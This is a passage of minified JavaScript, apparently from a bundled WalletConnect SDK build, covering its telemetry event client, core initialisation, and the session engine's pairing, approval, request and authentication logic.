rc(rc({},c),this.setMethods(c.eventId))}),Mt(this,"deleteEvent",i=>{const{eventId:o}=i;this.events.delete(o),this.shouldPersist=!0}),Mt(this,"setEventListeners",()=>{this.core.heartbeat.on(fo.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(i=>{be.fromMiliseconds(Date.now())-be.fromMiliseconds(i.timestamp)>R6&&(this.events.delete(i.eventId),this.shouldPersist=!0)})})}),Mt(this,"setMethods",i=>({addTrace:o=>this.addTrace(i,o),setError:o=>this.setError(i,o)})),Mt(this,"addTrace",(i,o)=>{const l=this.events.get(i);l&&(l.props.properties.trace.push(o),this.events.set(i,l),this.shouldPersist=!0)}),Mt(this,"setError",(i,o)=>{const l=this.events.get(i);l&&(l.props.type=o,l.timestamp=Date.now(),this.events.set(i,l),this.shouldPersist=!0)}),Mt(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),Mt(this,"restore",async()=>{try{const i=await this.core.storage.getItem(this.storageKey)||[];if(!i.length)return;i.forEach(o=>{this.events.set(o.eventId,rc(rc({},o),this.setMethods(o.eventId)))})}catch(i){this.logger.warn(i)}}),Mt(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const i=[];for(const[o,l]of this.events)l.props.type&&i.push(l);if(i.length!==0)try{if((await this.sendEvent(i)).ok)for(const o of i)this.events.delete(o.eventId),this.shouldPersist=!0}catch(o){this.logger.warn(o)}}),Mt(this,"sendEvent",async i=>{const o=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${D6}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${Zy}${o}`,{method:"POST",body:JSON.stringify(i)})}),Mt(this,"getAppDomain",()=>T_().url),this.logger=Sn(n,this.context),this.telemetryEnabled=r,r?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}}var RF=Object.defineProperty,b2=Object.getOwnPropertySymbols,DF=Object.prototype.hasOwnProperty,NF=Object.prototype.propertyIsEnumerable,om=(t,e,n)=>e in t?RF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,E2=(t,e)=>{for(var n in e||(e={}))DF.call(e,n)&&om(t,n,e[n]);if(b2)for(var n of b2(e))NF.call(e,n)&&om(t,n,e[n]);return t},lt=(t,e,n)=>om(t,typeof e!="symbol"?e+"":e,n);let kF=class kI extends g4{constructor(e){var n;super(e),lt(this,"protocol",bI),lt(this,"version",EI),lt(this,"name",Jy),lt(this,"relayUrl"),lt(this,"projectId"),lt(this,"customStoragePrefix"),lt(this,"events",new rr.EventEmitter),lt(this,"logger"),lt(this,"heartbeat"),lt(this,"relayer"),lt(this,"crypto"),lt(this,"storage"),lt(this,"history"),lt(this,"expirer"),lt(this,"pairing"),lt(this,"verify"),lt(this,"echoClient"),lt(this,"linkModeSupportedApps"),lt(this,"eventClient"),lt(this,"initialized",!1),lt(this,"logChunkController"),lt(this,"on",(c,u)=>this.events.on(c,u)),lt(this,"once",(c,u)=>this.events.once(c,u)),lt(this,"off",(c,u)=>this.events.off(c,u)),lt(this,"removeListener",(c,u)=>this.events.removeListener(c,u)),lt(this,"dispatchEnvelope",({topic:c,message:u,sessionExists:f})=>{if(!c||!u)return;const d={topic:c,message:u,publishedAt:Date.now(),transportType:dt.link_mode};this.relayer.onLinkMessageEvent(d,{sessionExists:f})});const r=this.getGlobalCore(e==null?void 0:e.customStoragePrefix);if(r)try{return this.customStoragePrefix=r.customStoragePrefix,this.logger=r.logger,this.heartbeat=r.heartbeat,this.crypto=r.crypto,this.history=r.history,this.expirer=r.expirer,this.storage=r.storage,this.relayer=r.relayer,this.pairing=r.pairing,this.verify=r.verify,this.echoClient=r.echoClient,this.linkModeSupportedApps=r.linkModeSupportedApps,this.eventClient=r.eventClient,this.initialized=r.initialized,this.logChunkController=r.logChunkController,r}catch(c){console.warn("Failed to copy global core",c)}this.projectId=e==null?void 0:e.projectId,this.relayUrl=(e==null?void 0:e.relayUrl)||SI,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const i=Af({level:typeof(e==null?void 0:e.logger)=="string"&&e.logger?e.logger:t6.logger,name:Jy}),{logger:o,chunkLoggerController:l}=f4({opts:i,maxSizeInBytes:e==null?void 0:e.maxLogBlobSizeInBytes,loggerOverride:e==null?void 0:e.logger});this.logChunkController=l,(n=this.logChunkController)!=null&&n.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var c,u;(c=this.logChunkController)!=null&&c.downloadLogsBlobInBrowser&&((u=this.logChunkController)==null||u.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=Sn(o,this.name),this.heartbeat=new fk,this.crypto=new l9(this,this.logger,e==null?void 0:e.keychain),this.history=new wF(this,this.logger),this.expirer=new EF(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new Gk(E2(E2({},n6),e==null?void 0:e.storageOptions)),this.relayer=new k9({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new gF(this,this.logger),this.verify=new _F(this,this.logger,this.storage),this.echoClient=new $F(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new CF(this,this.logger,e==null?void 0:e.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const n=new kI(e);await n.initialize();const r=await n.crypto.getClientId();return await n.storage.setItem(g6,r),n}get context(){return Fn(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(e2,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(e2)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const n=`_walletConnectCore_${e}`,r=`${n}_count`;return globalThis[r]=(globalThis[r]||0)+1,globalThis[r]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[r]} times.`),globalThis[n]}catch(n){console.warn("Failed to get global WalletConnect core",n);return}}setGlobalCore(e){var n;try{if(this.isGlobalCoreDisabled())return;const r=`_walletConnectCore_${((n=e.opts)==null?void 0:n.customStoragePrefix)||""}`;globalThis[r]=e}catch(r){console.warn("Failed to set global WalletConnect core",r)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&e6.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}};const BF=kF,BI="wc",LI=2,jI="client",uw=`${BI}@${LI}:${jI}:`,Hg={name:jI,logger:"error"},x2="WALLETCONNECT_DEEPLINK_CHOICE",LF="proposal",S2="Proposal expired",jF="session",Zo=be.SEVEN_DAYS,UF="engine",Ft={wc_sessionPropose:{req:{ttl:be.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:be.ONE_DAY,prompt:!1,tag:1104},res:{ttl:be.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:be.ONE_DAY,prompt:!1,tag:1106},res:{ttl:be.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:be.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:be.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:be.ONE_DAY,prompt:!1,tag:1112},res:{ttl:be.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:be.ONE_DAY,prompt:!1,tag:1114},res:{ttl:be.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:be.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:be.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:be.FIVE_MINUTES,prompt:!1,tag:1119}}},Vg={min:be.FIVE_MINUTES,max:be.SEVEN_DAYS},Kr={idle:"IDLE",active:"ACTIVE"},_2={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"}},MF="request",FF=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],zF="wc",qF="auth",HF="authKeys",VF="pairingTopics",WF="requests",Ff=`${zF}@${1.5}:${qF}:`,Wh=`${Ff}:PUB_KEY`;var KF=Object.defineProperty,GF=Object.defineProperties,YF=Object.getOwnPropertyDescriptors,I2=Object.getOwnPropertySymbols,JF=Object.prototype.hasOwnProperty,ZF=Object.prototype.propertyIsEnumerable,am=(t,e,n)=>e in t?KF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,it=(t,e)=>{for(var n in e||(e={}))JF.call(e,n)&&am(t,n,e[n]);if(I2)for(var n of I2(e))ZF.call(e,n)&&am(t,n,e[n]);return t},bn=(t,e)=>GF(t,YF(e)),me=(t,e,n)=>am(t,typeof e!="symbol"?e+"":e,n);class QF extends R4{constructor(e){super(e),me(this,"name",UF),me(this,"events",new Mm),me(this,"initialized",!1),me(this,"requestQueue",{state:Kr.idle,queue:[]}),me(this,"sessionRequestQueue",{state:Kr.idle,queue:[]}),me(this,"requestQueueDelay",be.ONE_SECOND),me(this,"expectedPairingMethodMap",new Map),me(this,"recentlyDeletedMap",new Map),me(this,"recentlyDeletedLimit",200),me(this,"relayMessageCache",[]),me(this,"pendingSessions",new Map),me(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(Ft)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},be.toMiliseconds(this.requestQueueDelay)))}),me(this,"connect",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();const r=bn(it({},n),{requiredNamespaces:n.requiredNamespaces||{},optionalNamespaces:n.optionalNamespaces||{}});await this.isValidConnect(r);const{pairingTopic:i,requiredNamespaces:o,optionalNamespaces:l,sessionProperties:c,scopedProperties:u,relays:f}=r;let d=i,y,g=!1;try{if(d){const T=this.client.core.pairing.pairings.get(d);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),g=T.active}}catch(T){throw this.client.logger.error(`connect() -> pairing.get(${d}) failed`),T}if(!d||!g){const{topic:T,uri:D}=await this.client.core.pairing.create();d=T,y=D}if(!d){const{message:T}=Ee("NO_MATCHING_KEY",`connect() pairing topic: ${d}`);throw new Error(T)}const E=await this.client.core.crypto.generateKeyPair(),w=Ft.wc_sessionPropose.req.ttl||be.FIVE_MINUTES,b=Nt(w),m=bn(it(it({requiredNamespaces:o,optionalNamespaces:l,relays:f??[{protocol:xI}],proposer:{publicKey:E,metadata:this.client.metadata},expiryTimestamp:b,pairingTopic:d},c&&{sessionProperties:c}),u&&{scopedProperties:u}),{id:Zr()}),x=Je("session_connect",m.id),{reject:S,resolve:O,done:$}=Fs(w,S2),R=({id:T})=>{T===m.id&&(this.client.events.off("proposal_expire",R),this.pendingSessions.delete(m.id),this.events.emit(x,{error:{message:S2,code:0}}))};return this.client.events.on("proposal_expire",R),this.events.once(x,({error:T,session:D})=>{this.client.events.off("proposal_expire",R),T?S(T):D&&O(D)}),await this.sendRequest({topic:d,method:"wc_sessionPropose",params:m,throwOnFailedPublish:!0,clientRpcId:m.id}),await this.setProposal(m.id,m),{uri:y,approval:$}}),me(this,"pair",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(n)}catch(r){throw this.client.logger.error("pair() failed"),r}}),me(this,"approve",async n=>{var r,i,o;const l=this.client.core.eventClient.createEvent({properties:{topic:(r=n==null?void 0:n.id)==null?void 0:r.toString(),trace:[$r.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(k){throw l.setError(js.no_internet_connection),k}try{await this.isValidProposalId(n==null?void 0:n.id)}catch(k){throw this.client.logger.error(`approve() -> proposal.get(${n==null?void 0:n.id}) failed`),l.setError(js.proposal_not_found),k}try{await this.isValidApprove(n)}catch(k){throw this.client.logger.error("approve() -> isValidApprove() failed"),l.setError(js.session_approve_namespace_validation_failure),k}const{id:c,relayProtocol:u,namespaces:f,sessionProperties:d,scopedProperties:y,sessionConfig:g}=n,E=this.client.proposal.get(c);this.client.core.eventClient.deleteEvent({eventId:l.eventId});const{pairingTopic:w,proposer:b,requiredNamespaces:m,optionalNamespaces:x}=E;let S=(i=this.client.core.eventClient)==null?void 0:i.getEvent({topic:w});S||(S=(o=this.client.core.eventClient)==null?void 0:o.createEvent({type:$r.session_approve_started,properties:{topic:w,trace:[$r.session_approve_started,$r.session_namespaces_validation_success]}}));const O=await this.client.core.crypto.generateKeyPair(),$=b.publicKey,R=await this.client.core.crypto.generateSharedKey(O,$),T=it(it(it({relay:{protocol:u??"irn"},namespaces:f,controller:{publicKey:O,metadata:this.client.metadata},expiry:Nt(Zo)},d&&{sessionProperties:d}),y&&{scopedProperties:y}),g&&{sessionConfig:g}),D=dt.relay;S.addTrace($r.subscribing_session_topic);try{await this.client.core.relayer.subscribe(R,{transportType:D})}catch(k){throw S.setError(js.subscribe_session_topic_failure),k}S.addTrace($r.subscribe_session_topic_success);const B=bn(it({},T),{topic:R,requiredNamespaces:m,optionalNamespaces:x,pairingTopic:w,acknowledged:!1,self:T.controller,peer:{publicKey:b.publicKey,metadata:b.metadata},controller:O,transportType:dt.relay});await this.client.session.set(R,B),S.addTrace($r.store_session);try{S.addTrace($r.publishing_session_settle),await this.sendRequest({topic:R,method:"wc_sessionSettle",params:T,throwOnFailedPublish:!0}).catch(k=>{throw S==null||S.setError(js.session_settle_publish_failure),k}),S.addTrace($r.session_settle_publish_success),S.addTrace($r.publishing_session_approve),await this.sendResult({id:c,topic:w,result:{relay:{protocol:u??"irn"},responderPublicKey:O},throwOnFailedPublish:!0}).catch(k=>{throw S==null||S.setError(js.session_approve_publish_failure),k}),S.addTrace($r.session_approve_publish_success)}catch(k){throw this.client.logger.error(k),this.client.session.delete(R,ut("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(R),k}return this.client.core.eventClient.deleteEvent({eventId:S.eventId}),await this.client.core.pairing.updateMetadata({topic:w,metadata:b.metadata}),await this.client.proposal.delete(c,ut("USER_DISCONNECTED")),await this.client.core.pairing.activate({topic:w}),await this.setExpiry(R,Nt(Zo)),{topic:R,acknowledged:()=>Promise.resolve(this.client.session.get(R))}}),me(this,"reject",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(n)}catch(l){throw this.client.logger.error("reject() -> isValidReject() failed"),l}const{id:r,reason:i}=n;let o;try{o=this.client.proposal.get(r).pairingTopic}catch(l){throw this.client.logger.error(`reject() -> proposal.get(${r}) failed`),l}o&&(await this.sendError({id:r,topic:o,error:i,rpcOpts:Ft.wc_sessionPropose.reject}),await this.client.proposal.delete(r,ut("USER_DISCONNECTED")))}),me(this,"update",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(n)}catch(y){throw this.client.logger.error("update() -> isValidUpdate() failed"),y}const{topic:r,namespaces:i}=n,{done:o,resolve:l,reject:c}=Fs(),u=Zr(),f=Zs().toString(),d=this.client.session.get(r).namespaces;return this.events.once(Je("session_update",u),({error:y})=>{y?c(y):l()}),await this.client.session.update(r,{namespaces:i}),await this.sendRequest({topic:r,method:"wc_sessionUpdate",params:{namespaces:i},throwOnFailedPublish:!0,clientRpcId:u,relayRpcId:f}).catch(y=>{this.client.logger.error(y),this.client.session.update(r,{namespaces:d}),c(y)}),{acknowledged:o}}),me(this,"extend",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(n)}catch(u){throw this.client.logger.error("extend() -> isValidExtend() failed"),u}const{topic:r}=n,i=Zr(),{done:o,resolve:l,reject:c}=Fs();return this.events.once(Je("session_extend",i),({error:u})=>{u?c(u):l()}),await this.setExpiry(r,Nt(Zo)),this.sendRequest({topic:r,method:"wc_sessionExtend",params:{},clientRpcId:i,throwOnFailedPublish:!0}).catch(u=>{c(u)}),{acknowledged:o}}),me(this,"request",async n=>{this.isInitialized();try{await this.isValidRequest(n)}catch(x){throw this.client.logger.error("request() -> isValidRequest() failed"),x}const{chainId:r,request:i,topic:o,expiry:l=Ft.wc_sessionRequest.req.ttl}=n,c=this.client.session.get(o);(c==null?void 0:c.transportType)===dt.relay&&await this.confirmOnlineStateOrThrow();const u=Zr(),f=Zs().toString(),{done:d,resolve:y,reject:g}=Fs(l,"Request expired. Please try again.");this.events.once(Je("session_request",u),({error:x,result:S})=>{x?g(x):y(S)});const E="wc_sessionRequest",w=this.getAppLinkIfEnabled(c.peer.metadata,c.transportType);if(w)return await this.sendRequest({clientRpcId:u,relayRpcId:f,topic:o,method:E,params:{request:bn(it({},i),{expiryTimestamp:Nt(l)}),chainId:r},expiry:l,throwOnFailedPublish:!0,appLink:w}).catch(x=>g(x)),this.client.events.emit("session_request_sent",{topic:o,request:i,chainId:r,id:u}),await d();const b={request:bn(it({},i),{expiryTimestamp:Nt(l)}),chainId:r},m=this.shouldSetTVF(E,b);return await Promise.all([new Promise(async x=>{await this.sendRequest(it({clientRpcId:u,relayRpcId:f,topic:o,method:E,params:b,expiry:l,throwOnFailedPublish:!0},m&&{tvf:this.getTVFParams(u,b)})).catch(S=>g(S)),this.client.events.emit("session_request_sent",{topic:o,request:i,chainId:r,id:u}),x()}),new Promise(async x=>{var S;if(!((S=c.sessionConfig)!=null&&S.disableDeepLink)){const O=await GB(this.client.core.storage,x2);await VB({id:u,topic:o,wcDeepLink:O})}x()}),d()]).then(x=>x[2])}),me(this,"respond",async n=>{this.isInitialized(),await this.isValidRespond(n);const{topic:r,response:i}=n,{id:o}=i,l=this.client.session.get(r);l.transportType===dt.relay&&await this.confirmOnlineStateOrThrow();const c=this.getAppLinkIfEnabled(l.peer.metadata,l.transportType);Qr(i)?await this.sendResult({id:o,topic:r,result:i.result,throwOnFailedPublish:!0,appLink:c}):dr(i)&&await this.sendError({id:o,topic:r,error:i.error,appLink:c}),this.cleanupAfterResponse(n)}),me(this,"ping",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(n)}catch(i){throw this.client.logger.error("ping() -> isValidPing() failed"),i}const{topic:r}=n;if(this.client.session.keys.includes(r)){const i=Zr(),o=Zs().toString(),{done:l,resolve:c,reject:u}=Fs();this.events.once(Je("session_ping",i),({error:f})=>{f?u(f):c()}),await Promise.all([this.sendRequest({topic:r,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:i,relayRpcId:o}),l()])}else this.client.core.pairing.pairings.keys.includes(r)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:r}))}),me(this,"emit",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(n);const{topic:r,event:i,chainId:o}=n,l=Zs().toString(),c=Zr();await this.sendRequest({topic:r,method:"wc_sessionEvent",params:{event:i,chainId:o},throwOnFailedPublish:!0,relayRpcId:l,clientRpcId:c})}),me(this,"disconnect",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(n);const{topic:r}=n;if(this.client.session.keys.includes(r))await this.sendRequest({topic:r,method:"wc_sessionDelete",params:ut("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:r,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(r))await this.client.core.pairing.disconnect({topic:r});else{const{message:i}=Ee("MISMATCHED_TOPIC",`Session or pairing topic not found: ${r}`);throw new Error(i)}}),me(this,"find",n=>(this.isInitialized(),this.client.session.getAll().filter(r=>Aj(r,n)))),me(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),me(this,"authenticate",async(n,r)=>{var i;this.isInitialized(),this.isValidAuthenticate(n);const o=r&&this.client.core.linkModeSupportedApps.includes(r)&&((i=this.client.metadata.redirect)==null?void 0:i.linkMode),l=o?dt.link_mode:dt.relay;l===dt.relay&&await this.confirmOnlineStateOrThrow();const{chains:c,statement:u="",uri:f,domain:d,nonce:y,type:g,exp:E,nbf:w,methods:b=[],expiry:m}=n,x=[...n.resources||[]],{topic:S,uri:O}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:l});this.client.logger.info({message:"Generated new pairing",pairing:{topic:S,uri:O}});const $=await this.client.core.crypto.generateKeyPair(),R=Hh($);if(await Promise.all([this.client.auth.authKeys.set(Wh,{responseTopic:R,publicKey:$}),this.client.auth.pairingTopics.set(R,{topic:R,pairingTopic:S})]),await this.client.core.relayer.subscribe(R,{transportType:l}),this.client.logger.info(`sending request to new pairing topic: ${S}`),b.length>0){const{namespace:N}=zh(c[0]);let V=M5(N,"request",b);qh(x)&&(V=z5(V,x.pop())),x.push(V)}const T=m&&m>Ft.wc_sessionAuthenticate.req.ttl?m:Ft.wc_sessionAuthenticate.req.ttl,D={authPayload:{type:g??"caip122",chains:c,statement:u,aud:f,domain:d,version:"1",nonce:y,iat:new Date().toISOString(),exp:E,nbf:w,resources:x},requester:{publicKey:$,metadata:this.client.metadata},expiryTimestamp:Nt(T)},B={eip155:{chains:c,methods:[...new Set(["personal_sign",...b])],events:["chainChanged","accountsChanged"]}},k={requiredNamespaces:{},optionalNamespaces:B,relays:[{protocol:"irn"}],pairingTopic:S,proposer:{publicKey:$,metadata:this.client.metadata},expiryTimestamp:Nt(Ft.wc_sessionPropose.req.ttl),id:Zr()},{done:G,resolve:W,reject:J}=Fs(T,"Request expired"),ne=Zr(),j=Je("session_connect",k.id),A=Je("session_request",ne),C=async({error:N,session:V})=>{this.events.off(A,U),N?J(N):V&&W({session:V})},U=async N=>{var V,F,q;if(await this.deletePendingAuthRequest(ne,{message:"fulfilled",code:0}),N.error){const fe=ut("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return N.error.code===fe.code?void 0:(this.events.off(j,C),J(N.error.message))}await this.deleteProposal(k.id),this.events.off(j,C);const{cacaos:Q,responder:te}=N.result,se=[],le=[];for(const fe of Q){await pE({cacao:fe,projectId:this.client.core.projectId})||(this.client.logger.error(fe,"Signature verification failed"),J(ut("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:xe}=fe,Oe=qh(xe.resources),Pe=[Ly(xe.iss)],Re=af(xe.iss);if(Oe){const Ue=gE(Oe),Zt=yE(Oe);se.push(...Ue),Pe.push(...Zt)}for(const Ue of Pe)le.push(`${Ue}:${Re}`)}const pe=await this.client.core.crypto.generateSharedKey($,te.publicKey);let he;se.length>0&&(he={topic:pe,acknowledged:!0,self:{publicKey:$,metadata:this.client.metadata},peer:te,controller:te.publicKey,expiry:Nt(Zo),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:S,namespaces:jE([...new Set(se)],[...new Set(le)]),transportType:l},await this.client.core.relayer.subscribe(pe,{transportType:l}),await this.client.session.set(pe,he),S&&await this.client.core.pairing.updateMetadata({topic:S,metadata:te.metadata}),he=this.client.session.get(pe)),(V=this.client.metadata.redirect)!=null&&V.linkMode&&(F=te.metadata.redirect)!=null&&F.linkMode&&(q=te.metadata.redirect)!=null&&q.universal&&r&&(this.client.core.addLinkModeSupportedApp(te.metadata.redirect.universal),this.client.session.update(pe,{transportType:dt.link_mode})),W({auths:Q,session:he})};this.events.once(j,C),this.events.once(A,U);let M;try{if(o){const N=ys("wc_sessionAuthenticate",D,ne);this.client.core.history.set(S,N);const V=await this.client.core.crypto.encode("",N,{type:Wc,encoding:ps});M=Oh(r,S,V)}else await Promise.all([this.sendRequest({topic:S,method:"wc_sessionAuthenticate",params:D,expiry:n.expiry,throwOnFailedPublish:!0,clientRpcId:ne}),this.sendRequest({topic:S,method:"wc_sessionPropose",params:k,expiry:Ft.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:k.id})])}catch(N){throw this.events.off(j,C),this.events.off(A,U),N}return await this.setProposal(k.id,k),await this.setAuthRequest(ne,{request:bn(it({},D),{verifyContext:{}}),pairingTopic:S,transportType:l}),{uri:M??O,response:G}}),me(this,"approveSessionAuthenticate",async n=>{const{id:r,auths:i}=n,o=this.client.core.eventClient.createEvent({properties:{topic:r.toString(),trace:[Us.authenticated_session_approve_started]}});try{this.isInitialized()}catch(m){throw o.setError(tc.no_internet_connection),m}const l=this.getPendingAuthRequest(r);if(!l)throw o.setError(tc.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${r}`);const c=l.transportType||dt.relay;c===dt.relay&&await this.confirmOnlineStateOrThrow();const u=l.requester.publicKey,f=await this.client.core.crypto.generateKeyPair(),d=Hh(u),y={type:Ri,receiverPublicKey:u,senderPublicKey:f},g=[],E=[];for(const m of i){if(!await pE({cacao:m,projectId:this.client.core.projectId})){o.setError(tc.invalid_cacao);const R=ut("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:r,topic:d,error:R,encodeOpts:y}),new Error(R.message)}o.addTrace(Us.cacaos_verified);const{p:x}=m,S=qh(x.resources),O=[Ly(x.iss)],$=af(x.iss);if(S){const R=gE(S),T=yE(S);g.push(...R),O.push(...T)}for(const R of O)E.push(`${R}:${$}`)}const w=await this.client.core.crypto.generateSharedKey(f,u);o.addTrace(Us.create_authenticated_session_topic);let b;if((g==null?void 0:g.length)>0){b={topic:w,acknowledged:!0,self:{publicKey:f,metadata:this.client.metadata},peer:{publicKey:u,metadata:l.requester.metadata},controller:u,expiry:Nt(Zo),authentication:i,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:l.pairingTopic,namespaces:jE([...new Set(g)],[...new Set(E)]),transportType:c},o.addTrace(Us.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(w,{transportType:c})}catch(m){throw o.setError(tc.subscribe_authenticated_session_topic_failure),m}o.addTrace(Us.subscribe_authenticated_session_topic_success),await this.client.session.set(w,b),o.addTrace(Us.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:l.pairingTopic,metadata:l.requester.metadata})}o.addTrace(Us.publishing_authenticated_session_approve);try{await this.sendResult({topic:d,id:r,result:{cacaos:i,responder:{publicKey:f,metadata:this.client.metadata}},encodeOpts:y,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(l.requester.metadata,c)})}catch(m){throw o.setError(tc.authenticated_session_approve_publish_failure),m}return await this.client.auth.requests.delete(r,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:l.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:o.eventId}),{session:b}}),me(this,"rejectSessionAuthenticate",async n=>{this.isInitialized();const{id:r,reason:i}=n,o=this.getPendingAuthRequest(r);if(!o)throw new Error(`Could not find pending auth request with id ${r}`);o.transportType===dt.relay&&await this.confirmOnlineStateOrThrow();const l=o.requester.publicKey,c=await this.client.core.crypto.generateKeyPair(),u=Hh(l),f={type:Ri,receiverPublicKey:l,senderPublicKey:c};await this.sendError({id:r,topic:u,error:i,encodeOpts:f,rpcOpts:Ft.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(o.requester.metadata,o.transportType)}),await this.client.auth.requests.delete(r,{message:"rejected",code:0}),await this.client.proposal.delete(r,ut("USER_DISCONNECTED"))}),me(this,"formatAuthMessage",n=>{this.isInitialized();const{request:r,iss:i}=n;return F_(r,i)}),me(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const n=this.relayMessageCache.shift();n&&await this.onRelayMessage(n)}catch(n){this.client.logger.error(n)}},50)}),me(this,"cleanupDuplicatePairings",async n=>{if(n.pairingTopic)try{const r=this.client.core.pairing.pairings.get(n.pairingTopic),i=this.client.core.pairing.pairings.getAll().filter(o=>{var l,c;return((l=o.peerMetadata)==null?void 0:l.url)&&((c=o.peerMetadata)==null?void 0:c.url)===n.peer.metadata.url&&o.topic&&o.topic!==r.topic});if(i.length===0)return;this.client.logger.info(`Cleaning up ${i.length} duplicate pairing(s)`),await Promise.all(i.map(o=>this.client.core.pairing.disconnect({topic:o.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(r){this.client.logger.error(r)}}),me(this,"deleteSession",async n=>{var r;const{topic:i,expirerHasDeleted:o=!1,emitEvent:l=!0,id:c=0}=n,{self:u}=this.client.session.get(i);await this.client.core.relayer.unsubscribe(i),await 